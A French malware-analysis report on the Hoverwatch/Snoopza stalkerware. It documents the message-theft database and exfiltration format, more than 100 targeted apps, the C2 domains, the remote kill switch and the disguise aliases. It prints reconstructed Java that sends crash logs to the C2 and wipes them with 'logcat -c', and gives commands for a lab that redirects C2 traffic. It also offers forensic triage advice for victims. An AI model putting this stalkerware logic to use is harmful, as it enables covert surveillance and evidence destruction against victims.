| `C0774n` | LINE | `jp.naver.line.android` |
| `C0775o` | KakaoTalk | `com.kakao.talk` |
| `C0762b` | Générique | Autres apps |

### 9.4 Interception des appels VoIP

Le parser WhatsApp détecte aussi les appels VoIP :
- `accept_incoming_call_view` → appel entrant accepté
- `ringing_dots` → appel sortant en cours
- `toggle_video_btn` → bascule audio/vidéo
- `participant_list` → participants (appels de groupe)
- `surface_view` → flux vidéo détecté

### 9.5 Schéma BDD `mpk_events` — données volées par message (v2)

**Source** : `p094hw.database.C0752h.mo4669A()` (équivalent `C0751h` dans Hoverwatch). Tag log = `"ImOb"` (IM Observer), module ID **304**.

La BDD locale SQLite stocke chaque événement IM (message, média, appel) dans **une table unique `mpk_events`** avant exfiltration vers le C2.

#### 9.5.1 Schéma SQL

```sql
CREATE TABLE IF NOT EXISTS mpk_events (
    _id    INTEGER PRIMARY KEY AUTOINCREMENT,
    uuid   VARCHAR NOT NULL,              -- timestamp formatté (clé de dédup globale)
    status INTEGER DEFAULT '0' NOT NULL,  -- 0 = en attente d'exfil, 1 = envoyé au C2
    time   INTEGER DEFAULT '-1' NOT NULL, -- timestamp original du message (ms epoch)
    im     INTEGER NOT NULL,              -- ID de l'app source (cf. table 9.5.3)
    cat    INTEGER DEFAULT '-1' NOT NULL, -- direction (cf. enum MESSAGE_DIRECTION)
    name   VARCHAR,                       -- nom du contact (interlocuteur)
    chat   VARCHAR,                       -- nom du chat/groupe
    me     VARCHAR,                       -- compte utilisé par la VICTIME
    res    VARCHAR,                       -- nom du fichier joint copié localement
    link   VARCHAR,                       -- URL externe (média partagé, etc.)
    data   VARCHAR                        -- CONTENU TEXTUEL du message (clair)
);
```

**Champs sensibles forensiquement** :
- `data` = contenu littéral du message en **texte clair** dans la BDD locale (avant exfil DES). Pour les médias, contient un placeholder `<Image>` / `<Sticker>` / `<Video>` / `<Audio>` / `<Document>` (cf. `m5503b0`)
- `me` = identifiant du compte de la victime sur l'app cible (numéro WhatsApp, handle Telegram, etc.) → permet d'identifier la victime depuis un dump de la BDD seul
- `name` + `chat` = identification complète des interlocuteurs et groupes
- `res` = chemin local d'une copie du fichier joint (image/audio/vidéo) — le fichier réel est copié dans le dossier de cache de l'app stalkerware avant exfil multipart

**Politique de rétention locale** :
- Max **300 messages par contact par app** (cf. `if (count > 300)` dans `C0752h$h.run()`)
- Au-delà, les plus anciens sont **supprimés localement** après envoi au C2 (les données restent côté backend Refog indéfiniment)
- Dédup temporelle par `im` (cf. `m5502a0`) : 60s pour `im=1` (texte) et `im=31`, 180s pour les médias (`im=4,5,6,7,9,11,13`), 120s par défaut

#### 9.5.2 Format JSON exfiltré (DTO `InstantMessage` + Gson)

Le DTO `p094hw.imreader.InstantMessage` est sérialisé par **Gson** vers JSON avant inclusion dans le multipart `log%04d`. Annotations `@SerializedName` directement extraites du bytecode :

| Champ Java | JSON | Type | Contenu volé |
|---|---|---|---|
| `_index` | `"N"` | int | Position du message dans la conversation |
| `_time_stamp` | `"time"` | Date | Timestamp d'envoi (ms epoch) |
| `_day_time` | `"sec"` | int | Décalage en secondes depuis minuit (timezone-relative) |
| `_seen_time` | `"seen"` | long | **Timestamp de lecture par le destinataire** (preuve de lecture) |
| `_msg_text` | `"text"` | String | **Contenu textuel du message en clair** |
| `_msg_len` | `"len"` | int | Longueur du texte (anti-tamper / stats côté C2) |
| `_direction` | `"direct"` | enum | `UNDEFINED` / `INBOUND` / `OUTBOUND` (cf. `ValsDB$MESSAGE_DIRECTION`) |
| `_from` | `"from"` | String | **Nom de l'expéditeur** (utile dans les groupes) |
| `_msg_type` | `"type"` | int | Type de contenu (cf. table 9.5.4) |

**Note importante** : le champ `_seen_time` capture la **lecture** par le destinataire (= preuve qu'un message a été lu, et quand). Pour un acteur abusif (IPV), c'est de la donnée extrêmement intrusive : permet de monitorer en temps réel l'activité de communication de la victime, pas seulement l'historique.

#### 9.5.3 Codes app `im` (à compléter par sample)

Les IDs `im` numériques mappent à chaque app cible. Reverse partiel (à confirmer) :

| `im` | App probable | Source |
|---|---|---|
| 1 | SMS générique / Texte | dédup 60s |
| 4 | Audio (vocal note) | dédup 180s |
| 5 | Vidéo | dédup 180s |
| 6 | Document/fichier | dédup 180s |
| 7 | Autre média | dédup 180s |
| 9 | (TBD) | dédup 180s |
| 11 | (TBD) | dédup 180s |
| 13 | (TBD) | dédup 180s |
| 31 | (TBD) | dédup 60s |

→ Mapping complet à dériver via instrumentation Frida sur device test (hooker `C0752h.m5507M`).

#### 9.5.4 Codes type `_msg_type`

Depuis `C0752h.m5503b0(int)` qui retourne un placeholder `<Type>` quand le texte est vide :

| `_msg_type` | Sens | Placeholder résolu via |
|---|---|---|
| 1 | Sticker | `C0756l.f5282g` |
| 2 | Image | `C0756l.f5280e` |
| 3 | (Voice/Audio call ?) | `C0756l.f5279d` |
| 4 | Vidéo | `C0756l.f5284i` |
| 5 | Audio (note vocale) | `C0756l.f5283h` |
| 6 | Document/fichier | `C0756l.f5281f` |

→ Strings réelles dépendent de la locale chargée par `C0867b0.f5982o.getString(C0756l.fXXXX)`. À résoudre depuis `res/values/strings.xml` (français disponible vu les locales `fr.refog.com` mentionnées AssoEchap).

#### 9.5.5 Cycle de vie d'un message intercepté (vue victime)

```
[Victime tape un message dans WhatsApp / Telegram / Signal / ...]
         │
         ▼
[AccessibilityService C0780r capture le node UI]
         │
         ▼
[Parser dédié (C0776p WhatsApp, C0764d Messenger, etc.) construit InstantMessage]
         │
         ▼
[InstantMessage.toDBFormat(im, name, t) → C0752h.i (DTO en mémoire)]
         │
         ▼
[C0752h.m5507M(i) → ajout queue + alarme 60s pour batch]
         │
         ▼
[m5492Q → m5493R → m5504c0 → ContentValues → INSERT INTO mpk_events]
         │
         ▼
[Si pièce jointe : m5491O copie le fichier dans dossier cache du stalkerware]
         │
         ▼
[ServiceCore sync loop → exfil HTTP multipart vers C2]
         │
         ▼
[UPDATE mpk_events SET status=1 (cf. C0752h$d)]
         │
         ▼
[Cleanup local : si > 300 msg/contact/app, suppression des plus anciens]
```

#### 9.5.6 Implications pour l'aide aux victimes

**Données potentiellement volées AVANT découverte du stalkerware** :

1. **Tous les messages textuels** envoyés et reçus depuis l'installation (~100 apps cibles, dont WhatsApp, Telegram, Signal, Threema)
2. **Les pièces jointes** (images, photos intimes, vocaux, vidéos, documents) — fichiers réels exfiltrés en multipart binary
3. **Les métadonnées de lecture** : qui a lu quoi et quand (`_seen_time`)
4. **Les identités complètes** des interlocuteurs (`name`, `chat`, `from`, `me`)
5. **Les appels VoIP** (audio enregistré + métadonnées de durée/participants pour groupes)
6. **Les SMS** classiques (via `READ_SMS`)
7. **Les contacts, calendrier, historique navigateur, bookmarks** (modules 304, 305, 313, 314)
8. **La géolocalisation continue** y compris en arrière-plan (`ACCESS_BACKGROUND_LOCATION`)
9. **Les screenshots** réguliers (Android < 11) et **photos caméra frontale silencieuses** (module 319)
10. **Les frappes clavier** (keylogger via Accessibility) → mots de passe, recherches, drafts non envoyés

**Recommandations triage forensic** (CSIRT / accompagnement victime) :
- **Préserver la preuve avant uninstall** : dump `/data/data/com.android.core.{mntan|mngam}/databases/` (si root disponible) ou via `adb backup` (Android < 12)
- **Lister les comptes potentiellement compromis** depuis le champ `me` de `mpk_events` → forcer reset password sur ces comptes
- **Identifier les conversations sensibles** depuis `chat` et `name` → alerter les interlocuteurs (notamment professionnels de santé, avocats, refuges)
- **Vérifier les médias copiés** dans le dossier cache du stalkerware (potentielles photos intimes ré-exposables)
- **Changer les credentials** de toutes les apps listées dans `m4841x()` (cf. §10) : la frappe a pu être enregistrée
- **Désactiver l'authentification par SMS/2FA SMS** si le téléphone était compromis (les codes ont fui)
- **Côté légal** : demander à Refog (via leur DPO si UE / via subpoena sinon) la liste des données exfiltrées et leur suppression — l'`ActivationID` retrouvé dans les SharedPreferences identifie l'opérateur abuseur

---

## 10. Applications ciblées — Classe `p053c.p077c.p081d.C0626d`

### 10.1 Messageries (54 apps, flag 304)

**Messaging** : WhatsApp, Facebook Messenger, Viber, Telegram, Telegram Plus, Google Hangouts, Google Chat, Google Meet, Snapchat, imo, LINE, LINE Lite, TextMe, Kik, WeChat, Signal, Discord, Microsoft Teams, KakaoTalk, Threema Work, Threema OnPrem, Vidogram, Zalo, Slack, Slack Intune, BBM Enterprise

**Social** : Instagram, VK Messenger, VKontakte, Odnoklassniki, TikTok, TikTok Lite, Tumblr, Weico (Weibo), Reddit, Twitter/X, Skype

**Dating (10 apps — IPV)** : Tinder, Tinder RU, Mamba, Pure, Fitil, Wamba, Muzmatch, Skylove, Boo, Waplog, Galaxy (RU)

**Email** : Gmail, Yandex Mail, Mail.ru, BlueMail, Outlook, Outlook Lite, Samsung Email

### 10.2 Navigateurs (44+ apps, flag 305)

Chrome, Firefox, Opera, Opera Mini, UC Browser, Yandex Browser, **Tor Browser**, DuckDuckGo, Edge, Samsung Internet, Brave, Kiwi, Cromite, Huawei Browser, MIUI Browser, Vivo Browser, OPPO/Heytap Browser, ASUS Browser, Sony Browser, HTC Browser, Quark, TCL, Adblock Plus, et ~20 autres

### 10.3 SMS (flag 313)

Google Messages + apps ajoutables dynamiquement via config serveur

### 10.4 Observations

- **100+ apps** ciblées au total
- **Fort biais russophone** : VK, OK, Yandex, Mail.ru, Mamba, Tinder RU, Galaxy
- **10 apps de dating** → surveillance relationnelle / IPV
- **Signal et Threema** ciblées via Accessibility → **contourne le chiffrement E2E**
- **Tor Browser** ciblé → tentative de surveiller la navigation anonyme
- **Config dynamique** : le serveur peut ajouter des apps à surveiller à distance
- **Strings chiffrées** : certains packages obfusqués via `C0870h.m6219c()` (DES)

---

## 11. Géolocalisation — Classe `p053c.p077c.p080c.C0616e`

### 11.1 Données collectées

```json
{
  "loc": {
    "cat": 1,
    "crd": [48.8566, 2.3522],
    "acc": 15.0,
    "spd": 25.2,
    "ssid": "MonWifi",
    "bssid": "AA:BB:CC:DD:EE:FF",
    "cellid": "208-01-1234-5678"
  }
}
```

### 11.2 Base de données locale

```sql
-- Événements GPS
CREATE TABLE mpk_events (
    _id INTEGER PRIMARY KEY AUTOINCREMENT,
    uuid VARCHAR NOT NULL,
    status INTEGER DEFAULT 0 NOT NULL,
    latitude FLOAT,
    longitude FLOAT,
    category INTEGER NOT NULL,
    speed INTEGER,
    accuracy FLOAT,
    cellid VARCHAR,
    bssid VARCHAR,
    ssid VARCHAR
);

-- Cache WiFi (BSSID → coordonnées)
CREATE TABLE mpk_wifi_location (
    bssid VARCHAR PRIMARY KEY,
    ssid VARCHAR,
    mnc INTEGER DEFAULT -1,
    lac INTEGER DEFAULT -1,
    date INTEGER,
    moveable INTEGER DEFAULT 0,
    latitude FLOAT,
    longitude FLOAT,
    category INTEGER NOT NULL,
    accuracy FLOAT
);

-- Cache cellulaire
CREATE TABLE mpk_cell_location (
    cellid VARCHAR PRIMARY KEY,
    mnc INTEGER DEFAULT -1,
    mcc INTEGER DEFAULT -1,
    lac INTEGER DEFAULT -1,
    cid INTEGER DEFAULT -1,
    date INTEGER,
    latitude FLOAT,
    longitude FLOAT,
    category INTEGER NOT NULL,
    accuracy FLOAT
);
```

---

## 12. Settings / État — Classe `p094hw.utils.C0888z`

| Clé SharedPreferences | Type | Usage |
|-----------------------|------|-------|
| `ActivationID` | String (DES) | Clé d'authentification C2 |
| `Password` | String (DES) | PIN de l'acheteur |
| `domains` | String (DES) | Liste des domaines C2 |
| `EnableMonitor` | Boolean | Activation surveillance |
| `HideIcon` | Boolean | Masquer l'icône launcher |
| `PinProtect` | Boolean | Protection par PIN |
| `ValidThrough` | Long | Timestamp expiration licence |
| `Subscription` | String (DES) | Type abonnement |
| `AppInstState` | Int (enum) | NOT_INSTALLED / INSTALLED / UNINSTALL_ASK |
| `SyncServerLastTime` | Long | Dernier sync réussi |
| `SynchServerLastTime` | Long | Dernier sync (variante) |
| `SettingsVersion` | Long | Version settings serveur |
| `Version` | String | Version app |
| `DebugMode` | Boolean | Mode debug |
| `MemoryLimit` | Boolean | Limite mémoire atteinte |
| `UserPermState-{id}` | Int | État de chaque permission |
| `UserPermSent-{id}` | Boolean | Permission reportée au serveur |

### 12.1 Gestion de licence

- **Validité** : `ValidThrough` + 7 jours de grâce (604800000 ms)
- **Verrouillage** : `ValidThrough` + 42 jours (3628800000 ms)
- **Période sync normale** : 5 min
- **Période sync erreur licence** : 720 min (12h)
- **Kill switch** : code 410 → `C0744c.m5393a()` puis `m5395c()` (cf. §20). Note v3 : la classe est `C0744c` dans Snoopza, `C0743c` dans Hoverwatch (décalage JADX numbering).

---

## 13. Vulnérabilités identifiées

| # | Vulnérabilité | Sévérité | Impact |
|---|---------------|----------|--------|
| 1 | Pas de vérification SSL (TrustAll + HostnameVerifier=true) | **CRITIQUE** | MITM trivial |
| 2 | DES/ECB avec clé effective `"vallengt"` hardcodée (dérivée de `"val"` + padding `"length 8"`) | **CRITIQUE** | Déchiffrement de toutes les données locales ET des domaines C2 seedés in-binary |
| 3 | Services/Receivers exportés (`exported="true"`) | **HAUTE** | Contrôle local par app tierce |
| 4 | Kill switch distant (HTTP 410) | **HAUTE** | Suppression preuves à distance |
| 5 | Pas de certificate pinning | **HAUTE** | Proxy interception sans modification APK |
| 6 | Credentials acheteur récupérables | **HAUTE** | Identification de l'abuseur via forensics |
| 7 | Domaines C2 en clair après déchiffrement DES | MOYENNE | IOC extraction facilitée |
| 8 | Screenshots JPEG qualité 40% | FAIBLE | Qualité faible mais suffisante pour lire du texte |
| 9 | Notifications foreground vides | FAIBLE | Détectable (Android 13+) |
| 10 | Keylogger via AccessibilityService | **HAUTE** | Capture de tous les mots de passe saisis |
| 11 | Caméra frontale silencieuse (module 319) | **HAUTE** | Photos de la victime à son insu |
| 12 | Configuration modules à distance | **HAUTE** | L'abuseur active/désactive la surveillance sans accès physique |
| 13 | Persistance d'identifiant cross-install via fichier sdcard (`/sdcard/dev_<model>`) | **HAUTE** | Le C2 reconnaît le device même après désinstallation ; IOC forensique post-uninstall ; le fichier contient l'ANDROID_ID en clair |

---

## 14. Mapping des classes obfusquées

| Classe obfusquée | Nom réel | Rôle |
|------------------|----------|------|
| `p094hw` | `hw` | Package principal Hoverwatch |
| `p092e.p093a.C0736a` | `HttpClient` | Client HTTP C2 |
| `p092e.p093a.C0737b` | `NetworkUtils` | Vérification réseau |
| `p092e.p093a.C0739d` | `TrustAllManager` | TrustManager permissif |
| `p094hw.utils.C0888z` | `Settings` | SharedPreferences / état |
| `p094hw.utils.C0870h` | `CryptoHelper` | Chiffrement DES |
| `p094hw.utils.C0874l` | `Logger` | Logging interne |
| `p094hw.utils.C0877o` | `Utils` | Utilitaires divers |
| `p094hw.utils.C0887y` | `ModuleConfig` | Configuration des modules |
| `p094hw.utils.C0873k` | `EventTracker` | Tracking événements |
| `p094hw.utils.C0863b0` | `AppConstants` | Constantes globales |
| `p053c.p077c.p081d.C0626d` | `TaskSendEvents` | Collecteur IM/Browser/SMS |
| `p053c.p077c.p080c.C0616e` | `ObserverLocation` | Collecteur GPS |
| `p053c.p077c.p079b.C0611d` | `ScreenCapture` | Capture d'écran |
| `p094hw.imreader.C0776p` | `WhatsAppParser` | Parser WhatsApp |
| `p094hw.imreader.C0764d` | `MessengerParser` | Parser Facebook Messenger |
| `p094hw.imreader.C0769i` | `InstagramParser` | Parser Instagram |
| `p094hw.recorder.C0856j` | `AudioRecorder` | Enregistrement audio |
| `p094hw.database.C0751h` | `IMDatabase` | Base messages IM |
| `p094hw.database.C0747d` | `ContentObserverCollector` | Collecteur ContentProvider |
| `p094hw.core.C0743c` | `UninstallManager` | Auto-désinstallation |

---

## 20. Kill switch `C0744c` (v3 — Snoopza, équiv. `C0743c` Hoverwatch)

### 20.1 Architecture

Contrairement à ce que le terme "kill switch" suggère, **il n'y a PAS d'auto-désinstallation silencieuse**. Le mécanisme est en deux phases :

**Phase 1 — Mise en état `UNINSTALL_ASK`** (méthode `C0744c.m5393a()`) :
```java
public static void m5393a() {
    if (C0892z.m6618o() != APP_STATE_UNINSTALL_ASK) {
        C0892z.m6641z0(APP_STATE_UNINSTALL_ASK);
        if (f5154a != null) f5154a.mo4066a(null);  // callback registered by ActivityMain
    }
}
```

Déclencheurs identifiés via `search_method_by_name("m5393a")` :
- `p092e.p093a.C0737a` — quand le C2 renvoie HTTP 410
- `p053c.p077c.p081d.C0624b` (TskInit) — probablement si licence expirée localement (timer `ValidThrough + 42 jours`)
- `com.utils.receivers.ReceiverUserPresent` — au déverrouillage de l'écran (priority `2147483646` = max possible)

**Phase 2 — Affichage du prompt système** (méthode `C0744c.m5395c(activity, z)`) :
```java
public void mo4061a() {
    activity.startActivityForResult(
        new Intent("android.intent.action.DELETE", C0881o.m6360j0()),
        1002
    );
}
```

→ C'est un `Intent.ACTION_DELETE` Android **standard**. L'utilisateur voit le prompt natif Android : *"Voulez-vous désinstaller cette app ?"*. Pas de bypass de l'UI Android.

### 20.2 Vecteurs d'affichage du prompt

- `ActivityMain.onCreate()` — au prochain launch user
- `ReceiverUserPresent` — au prochain déverrouillage écran (priority max → s'exécute avant tout)

### 20.3 Social engineering — pourquoi ça marche

Le nom de package est `com.android.core.mntan` (Hoverwatch) ou `com.android.core.mngam` (Snoopza). Quand le prompt Android natif s'affiche, il liste l'app par son **applicationLabel** (générique style `Android Monitor` ou `System Service`) avec son icône système. **L'utilisateur a de fortes chances de cliquer OK par réflexe**, croyant qu'il s'agit d'un nettoyage système légitime.

### 20.4 Pourquoi Refog implémente ça

Hypothèses :
- **Réduction de la surface forensique** : si la licence n'est pas renouvelée, l'app disparaît du device → moins de traces post-mortem si l'utilisateur lance une analyse plus tard
- **Containment de breach** : si Refog détecte une compromission de leur C2 ou un takedown imminent, ils peuvent envoyer 410 à toutes les instances pour cleanup massif
- **Réponse aux ordres légaux** : permet de couper une instance individuelle sans nécessiter accès physique au device

### 20.5 Détection / IoC

Sur device :
- SharedPreferences key `AppInstState` = `2` (UNINSTALL_ASK) — visible dans `/data/data/com.android.core.X/shared_prefs/`
- Intent `android.intent.action.DELETE` avec `requestCode=1002` lancé

Sur réseau :
- Réponse C2 avec **HTTP 410** sur n'importe quel endpoint `/api/online/*`

---

## 21. Anti-forensics — Logcat scraping & clearing (v3)

Classe interne `p094hw.utils.C0878l$a extends AbstractC0883q`. 4 strings DES déchiffrées :

```
A+lQI+gVHJo=                    → "logcat"
0Uji2E/esiv4G0Mf1dQghVqVAqSyHaJX → " -d -v time -b crash "
KCiTyJ1RfIhtFxFtjPmoopa89NVCKFvN → "E/AndroidRuntime"
WoCJfsNr1es=                    → " -c"
```

Reconstitution du flow :
```java
// 1. Lire les crashes Java récents
String cmd = "logcat" + " -d -v time -b crash " + "###:F";  // C0867b0.f5983p = "###"
ArrayList lines = C0876j.m6249a(cmd);

// 2. Filtrer les stack traces E/AndroidRuntime
for (String line : lines) {
    String filtered = line.replace("E/AndroidRuntime", "");
    if (!filtered.isEmpty()) result += filtered + "\n";
}

// 3. Envoyer au C2 via le canal logs
if (result.indexOf("###") > -1) {
    C0878l.m6257o(result, "FE");           // tag "FE" = Forced Exception ?
    C0877k.m6253q(65, result);             // event id 65
}

// 4. CLEAR les logs système (anti-forensics)
Runtime.getRuntime().exec("logcat" + " -c");
```

**Deux capacités combinées** :

1. **Crash exfiltration** vers le C2 — Refog reçoit les stack traces Java de **tous les crashes Android** survenus sur le device (pas juste les leurs). Permet de monitor :
   - Quels antivirus / outils de détection sont actifs
   - Quelles autres apps crashent (intelligence sur le comportement utilisateur)
   - Bugs dans leurs propres composants pour debug remote

2. **Log clearing** — `logcat -c` purge le buffer logs système côté victime. Si un investigateur ou l'utilisateur lance `adb logcat` ou un outil forensic, **toutes les traces sont effacées**.

**Limitations Android modernes** :
- `READ_LOGS` est **signature-level depuis Android 4.1** (2012) — non grantable à une app standard
- `Runtime.exec("logcat")` lancé depuis un process app n'a accès qu'**au log de son propre PID** depuis Android 4.1
- Donc cette branche est **dormante** sur device non-rooté ou sans firmware OEM custom
- Reste **active** sur : devices rootés, OEM avec accord pré-installé, ROMs custom, devices Chinese non-Google

→ Refog **a investi du code et de l'obfuscation DES** pour cette feature → ils ont des clients sur ces devices.

---

## 22. Flow installer — `ActivityInstaller` (v3)

### 22.1 Architecture

`p094hw.installer.ActivityInstaller` extends `ActivityC0427e` (FragmentActivity), gère un **stack de fragments** (`Stack<String> f5497o`) avec une transition séquentielle. ViewModel partagé : `C0844b` (lifecycle-aware).

La méthode pivot `m5816B()` (push fragment suivant) n'est pas décompilable par JADX — mais `onBackPressed()` révèle la **séquence canonique des 11 fragments** dans l'ordre du stack :

### 22.2 Séquence des 11 fragments

| # | Fragment | Rôle |
|---|---|---|
| 1 | `FragmentInstallHello` | Écran d'accueil (branding HWA/SNPA selon build) |
| 2 | `FragmentInstallLicense` | Acceptation EULA / licence |
| 3 | `FragmentInstallCheckOldVersions` | Détecte versions précédentes du package, propose migration |
| 4 | `FragmentInstallMonitorType` | **Sélection `user_type`** : `CHILD_DEVICE` (0) / `EMPLOYEE_DEVICE` (1) / `OWN_DEVICE` (2) — stockée dans `C0844b.f5688m` |
| 5 | `FragmentInstallLogin` | Saisie credentials (`username`, `password`) → POST `api/online/registration/` |
| 6 | `FragmentInstallLogSelection` | **Sélection des modules de surveillance à activer** (cf. §22.3) |
| 7 | `FragmentInstallSysPermissions` | Demande des permissions runtime Android (50+ méthodes — la plus complexe) |
| 8 | `FragmentInstallAccessibilityService` | Ouvre `Settings.ACTION_ACCESSIBILITY_SETTINGS`, demande l'activation manuelle |
| 9 | `FragmentInstallScreenshots` | Demande la permission `MediaProjection` via `ScreenshotCheckerActivity` |
| 10 | `FragmentInstallPIN` | Configure le PIN de protection (DES-encrypted dans SharedPref `Password`) |
| 11 | `FragmentInstallFinish` | Active `EnableMonitor=true`, lance `ServiceCore`, optionnellement `HideIcon=true` |

### 22.3 Modules togglables au setup — méthode `m5819y()`

La méthode `m5819y()` synchronise le ViewModel avec les valeurs côté `C0891y` (config persistée) pour **18 modules de surveillance** :

| Toggle key | Collector ID | Module |
|---|---|---|
| `CALLS` | 312 | Enregistrement appels téléphoniques |
| `LOCATION` | 314 | GPS + WiFi BSSID + Cell ID |
| `SMS` | 313 | SMS via Google Messages |
| `SELFIE` | 317 | Photos caméra (frontale par défaut, cf. `frcam`) |
| `GALLERY` | 319 | Photos galerie + caméra frontale silencieuse |
| `APPS` | 307 | Apps installées + utilisation |
| `TEXT` | 301 | Keylogger texte (toutes les frappes) |
| `CONTACTS` | 315 | Contacts via ContentProvider |
| `CALENDAR` | 316 | Événements calendrier |
| `SYSTEM` | 308 | Événements système (boot, batterie, etc.) |
| `CHATS` | 304 | Messages IM (WhatsApp, Telegram, Signal, etc.) |
| `WEBSITES` | 305 | Historique navigateur (44+ apps) |
| `CALLREC` | 312 | Enregistrement audio des appels (rec sub-flag de CALLS) |
| `CHATREC` | 304 | Enregistrement audio appels VoIP IM (rec sub-flag de CHATS) |
| `SCREENSHOTS` | 302 | Captures d'écran périodiques |
| `WEBSCREENSHOTS` | 305 | Screenshot lors de chaque visite URL |
| `IMSCREENSHOTS` | 304 | Screenshot lors de chaque message IM |
| `SMSSCREENSHOTS` | 313 | Screenshot lors de chaque SMS |

→ **L'acheteur fait son shopping de modules à l'installation**, mais Refog peut tout réactiver ensuite via la config distante (cf. §6.4). Le toggle initial = UX trompeuse : ce qui n'est pas activé au setup peut l'être à distance sans notification.

### 22.4 Validation finale — `m5820z()`

```java
public boolean m5820z() {
    C0742a a = C0742a.m5374p(this);
    if (!a.m5390w() || !C0881o.m6291B0()) return true;     // pas tout permis
    int sdk = Build.VERSION.SDK_INT;
    if (sdk >= 23 && (!a.m5391x() || !a.m5388u())) return true;  // permissions runtime manquantes
    if (sdk >= 21 && !a.m5389v()) return true;               // device admin pas accordé
    return !(!C0742a.m5379z());                              // accessibility service activé ?
}
```

Retourne `true` si **encore quelque chose à configurer**. Tant que `true`, l'installer ne sort pas — il rejoue le fragment manquant.

### 22.5 État final stocké

À la fin du flow, `C0892z.m6641z0(APP_STATE_INSTALLED)` est appelé. Les fields `C0867b0` exposés au runtime contiennent toute la config installer (`f5688m` = monitor type, etc.) qui est ensuite envoyée dans le premier sync `api/online/registration/`.

---

## 23. Système de camouflage — 8 déguisements (v4 — 2026-04-21)

### 23.1 Mécanisme

Hoverwatch déclare dans son manifest **8 `<activity-alias>`** avec le filtre `MAIN/LAUNCHER`, chacun portant le label et l'icône d'une app système Android standard. À l'installation, les 8 apparaissent dans le launcher Android, provoquant un dialog "Complete Action Using" quand l'utilisateur clique.

Les 8 déguisements observés sur Corellium :

| # | Label affiché | App système usurpée |
|---|---|---|
| 1 | Settings | `com.android.settings` |
| 2 | Calendar | Calendrier |
| 3 | Camera | Caméra |
| 4 | Clock | Horloge |
| 5 | Contacts | Contacts |
| 6 | Gallery | Galerie |
| 7 | Messaging | SMS |
| 8 | Phone | Téléphone |

### 23.2 Comportement des Starters

Les 3 activity-aliases dans le resolver table correspondent à 3 classes distinctes avec des comportements différents :

| Classe | Comportement |
|---|---|
| `ActivityMainStarter` | **Seul point d'entrée valide** — `C0698a.m5190s(true)` → `startActivity(ActivityMain.class)` → détecte `NOT_INSTALLED` → lance wizard |
| `ActivitySettingsStarter` | **Cover behavior** — `ActivityMain.m4857T()` (no-op si `f4746x == null`) + `startActivity("android.settings.SETTINGS")` + `finish()` → ouvre les vrais Settings |
| `ActivityDblStarter` | Variante cover behavior |

### 23.3 Flow normal d'installation (confirmé par reverse)

1. L'attaquant sideloade l'APK
2. Clique sur l'icône **principale** dans le launcher (`ActivityMainStarter`)
3. `ActivityMain.onCreate()` détecte `APP_STATE_NOT_INSTALLED` → lance le wizard (`m4853P()`)
4. Après le wizard, l'attaquant choisit un déguisement
5. L'app désactive les autres aliases via `PackageManager.setComponentEnabledSetting()` → seul le déguisement choisi reste visible dans le launcher

### 23.4 Piège Corellium

Sur Corellium, le picker "Complete Action Using" montrait les 8 options. Choisir "Settings" lançait `ActivitySettingsStarter` → vrais Settings Android → aucun process `mntau` spawné → impression que l'app ne fonctionne pas. **Ce n'est pas un anti-VM** — c'est un mauvais choix dans le picker.

### 23.5 Finding pour la thèse

Pattern de camouflage par **usurpation d'identité système sélectionnable** : l'attaquant choisit l'identité de couverture au moment du setup. C'est différent de Mobile Tracker Free qui hardcode une seule identité ("System Service"). Hoverwatch offre 8 choix, augmentant la capacité d'adaptation au contexte du device victime (si Calendar est déjà présent, choisir Clock ; si Settings a une icône différente du thème, choisir Phone, etc.).

### 23.6 Anti-VM / Anti-émulation : zéro

Recherche exhaustive via JADX (search_classes_by_keyword) sur : `qemu`, `goldfish`, `corellium`, `isEmulator`, `SafetyNet`, `PlayIntegrity`, `Build.FINGERPRINT`, `Build.HARDWARE`, `Build.PRODUCT`, `Build.BOARD`, `Build.BRAND`, `/dev/socket`, `test-keys`, `ranchu`, `vbox`, `SystemProperties`, `getprop` — **tous 0 hits**.

Seuls 3 usages bénins de `Build.MODEL`/`Build.MANUFACTURER` dans `C0884o` : chaîne de télémétrie, fallback "Android", sélection AudioSource Samsung/Huawei.

DexDispatch confirme : 16 504 méthodes, **0 méthodes natives**, 0 native boundaries.

---

## 24. Analyse dynamique — Setup lab Corellium (v4 — 2026-04-21)

### 24.1 Prérequis

- VM Corellium Android (root, shell via console web ou adb over SSH)
- Mock C2 FastAPI (`mock_c2/server.py`) sur le PC d'analyse
- APK Hoverwatch `hoverwatch_20260420.apk`

### 24.2 Connectivité VM → Mock C2

**Problème** : pas de VPN (OpenVPN Windows ne supporte pas le mode TAP requis par Corellium). La VM ne peut pas joindre le PC directement.

**Solution** : `adb reverse` via le tunnel SSH Corellium.

Le port 443 est privilégié et `adb reverse tcp:443` retourne `Permission denied`. Contournement en deux étapes :

```bash
# 1. Côté PC — reverse port forwarding sur port non-privilégié
adb reverse tcp:8443 tcp:8443

# 2. Côté VM Corellium (shell root) — iptables redirige 443 → 8443
iptables -t nat -A OUTPUT -p tcp -d 127.0.0.1 --dport 443 -j REDIRECT --to-port 8443
```

### 24.3 Redirection DNS

Le filesystem root de Corellium est monté read-only (`/dev/root on / type ext4 (ro)`). Remontage :

```bash
mount -o rw,remount /
echo "127.0.0.1 a.syncvch.com" >> /etc/hosts
echo "127.0.0.1 i1.hoverwatch.com" >> /etc/hosts
echo "127.0.0.1 hwa.cab" >> /etc/hosts
mount -o ro,remount /
```

> **Note** : `/system` n'est pas dans `/proc/mounts` sur Corellium — utiliser `mount -o rw,remount /` (root directement).

### 24.4 Lancement du mock C2

```bash
# Côté PC
cd C:\Users\sebdr\workspace\stalkerwares_analyses\hoverwatch\mock_c2
uv run uvicorn server:app --host 127.0.0.1 --port 8443 --ssl-keyfile mock.key --ssl-certfile mock.crt
```

L'app accepte le cert self-signed grâce au `TrustAllManager` (`C0740d` + `HostnameVerifier` retournant `true`) — pas besoin de Frida pour le SSL bypass.

### 24.5 Vérification

Depuis le shell Corellium :

```bash
curl -k https://a.syncvch.com:8443/
# Doit retourner le JSON du dashboard mock C2 :
# {"server":"Refog Mock C2 (Hoverwatch / Snoopza)","version":"2.0.0","status":"running",...}
```

### 24.6 Chemin réseau complet

```
App (Hoverwatch)  →  https://a.syncvch.com:443
  → /etc/hosts      →  127.0.0.1:443
  → iptables NAT    →  127.0.0.1:8443
  → adb reverse     →  PC:8443
  → mock C2 server  →  server.py (FastAPI/uvicorn)
```

### 24.7 Lancement de l'app

```bash
# Lancer le wizard directement (bypass les activity-aliases)
am start -n com.android.core.mntau/hw.installer.ActivityInstaller

# OU lancer via le flow normal (ActivityMain détecte NOT_INSTALLED → wizard)
am start -n com.android.core.mntau/com.activities.ActivityMainStarter
```

